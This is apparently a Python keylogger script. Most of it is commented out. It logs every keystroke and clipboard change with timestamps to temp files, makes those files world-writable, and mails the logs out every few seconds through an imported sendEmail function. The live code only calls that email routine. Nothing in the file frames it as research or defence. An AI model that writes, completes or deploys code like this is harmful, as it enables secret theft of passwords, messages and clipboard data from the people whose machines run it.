# import atexit
# import os
# import stat
# import threading
# import time
# from datetime import datetime 
# from pynput import keyboard
# import pyperclip
# from threading import Thread
# import ctypes
from emailFunctionality import sendEmail
# from encryption import encryptContents 
# import tempfile

# ThreadRunning = True
# log_file = os.path.join(tempfile.gettempdir(), 'logs.txt')

# # log_file = "logs.txt"
# clipBoard_file = "clipBoardLogs.txt"
# clipBoard_file = os.path.join(tempfile.gettempdir(), 'clipBoardLogs.txt')


# logBin = os.path.join(tempfile.gettempdir(), 'logs.bin')

# # log_file = "logs.txt"
# clipBin = os.path.join(tempfile.gettempdir(), 'clipBoardLogs.bin')

# try:
#     os.chmod(log_file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
#     print(f"Permissions for {log_file} changed successfully.")
# except PermissionError:
#     print(f"Permission denied: Unable to change permissions for {log_file}.")
# except FileNotFoundError:
#     print(f"File not found: {log_file} does not exist.")
# except Exception as e:
#     print(f"An error occurred: {e}")


# try:
#     os.chmod(clipBoard_file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
#     print(f"Permissions for {log_file} changed successfully.")
# except PermissionError:
#     print(f"Permission denied: Unable to change permissions for {log_file}.")
# except FileNotFoundError:
#     print(f"File not found: {log_file} does not exist.")
# except Exception as e:
#     print(f"An error occurred: {e}")

# try:
#     os.chmod(logBin, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
#     print(f"Permissions for {logBin} changed successfully.")
# except PermissionError:
#     print(f"Permission denied: Unable to change permissions for {logBin}.")
# except FileNotFoundError:
#     print(f"File not found: {logBin} does not exist.")
# except Exception as e:
#     print(f"An error occurred: {e}")


# try:
#     os.chmod(clipBin, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
#     print(f"Permissions for {clipBin} changed successfully.")
# except PermissionError:
#     print(f"Permission denied: Unable to change permissions for {clipBin}.")
# except FileNotFoundError:
#     print(f"File not found: {clipBin} does not exist.")
# except Exception as e:
#     print(f"An error occurred: {e}")



# with open(log_file, "w"):
#     pass

# with open(clipBoard_file, "w"):
#     pass
# def on_press(key):
#     global ThreadRunning
#     if key == keyboard.Key.esc:
#         print("escape")
#         ThreadRunning = False
#         return False  
    
#     keyPressed = returnKeyType(key)

#     with open(log_file, "a") as keyLogs:
#         keyLogs.write(parseOutput(keyPressed))

# def returnKeyType(key):
#     try:
#         keyPressed = key.char
#     except AttributeError:
#         keyPressed = key.name

#     return keyPressed

# def parseOutput(keyPressed):
#     currTime = datetime.now()
#     currTimeString = currTime.strftime("%H:%M:%S %d-%m-%Y")
#     keyPressed = keyPressed + "     " + currTimeString + "\n"
#     return keyPressed

# def checkClipBoard():
#     prevContent = None

#     while ThreadRunning:
#         currContent = pyperclip.paste()
#         if currContent != prevContent:
#             prevContent = currContent

#         with open(clipBoard_file, "a") as clipBoardKeyLogs:
#             clipBoardKeyLogs.write(parseOutput(prevContent))
#         time.sleep(1)
    
# def sendToEmail():

#     while ThreadRunning:

#         sendEmail()
#         time.sleep(5)

#     return

if __name__ == "__main__":
    # try: 
    #     listener = keyboard.Listener(on_press=on_press)
    #     checkClipBoardThread = threading.Thread(target=checkClipBoard)
    #     checkClipBoardThread.daemon = True
    #     checkClipBoardThread.start()

    #     sendEmailThread = threading.Thread(target=sendToEmail)
    #     sendEmailThread.daemon = True
    #     sendEmailThread.start()

    #     listener.start() 
    #     listener.join()

    # except KeyboardInterrupt:
    #     ThreadRunning = False
    sendEmail()
